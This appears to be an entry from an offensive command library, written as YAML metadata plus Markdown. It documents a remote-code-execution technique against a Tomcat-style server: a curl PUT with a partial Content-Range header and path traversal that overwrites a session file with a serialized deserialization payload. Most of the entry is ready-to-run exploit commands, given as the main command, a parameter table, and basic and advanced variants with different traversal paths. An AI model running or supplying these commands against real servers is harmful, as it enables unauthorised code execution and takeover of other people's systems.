---
data: >-
  curl -X PUT --header "Content-Range: bytes 0-999/1000" --data-binary
  @payload.ser
  http://target:8080/public/upload/../../work/Catalina/localhost/app/SESS.<hash>.ser
  -v
tags:
  - rce
  - deserialization
  - http
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:25:17.442Z'
id: fbe6e2d6-e8ef-4398-8d7b-2996619d9dbd
verified: false
validated: true
submitted: true
---
# curl-session-injection-put

## Command

```bash
curl -X PUT --header "Content-Range: bytes 0-999/1000" --data-binary @payload.ser http://target:8080/public/upload/../../work/Catalina/localhost/app/SESS.<hash>.ser -v
```

## Description

Injects a serialized deserialization payload into a session file using partial PUT traversal.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X PUT` | PUT method | Yes |
| `--header "Content-Range: bytes 0-999/1000"` | Range for partial | Yes |
| `--data-binary @payload.ser` | Binary payload file | Yes |
| `http://target:8080/public/upload/../../work/Catalina/localhost/app/SESS.<hash>.ser` | Session file URL | Yes |
| `-v` | Verbose | No |

## Examples

### Basic Usage

```bash
curl -X PUT --header "Content-Range: bytes 0-999/1000" --data-binary @payload.ser http://target:8080/public/upload/../../work/Catalina/localhost/app/SESS.hash.ser -v
```

### Advanced Usage

```bash
curl -X PUT --header "Content-Range: bytes 0-0/1000" --data-binary @gadget.ser http://target:8080/upload/../../../SESSIONS/SESS.id -v
```

## Expected Output

HTTP 200 if overwrite succeeds.

## Related

- [[Related Procedure]]
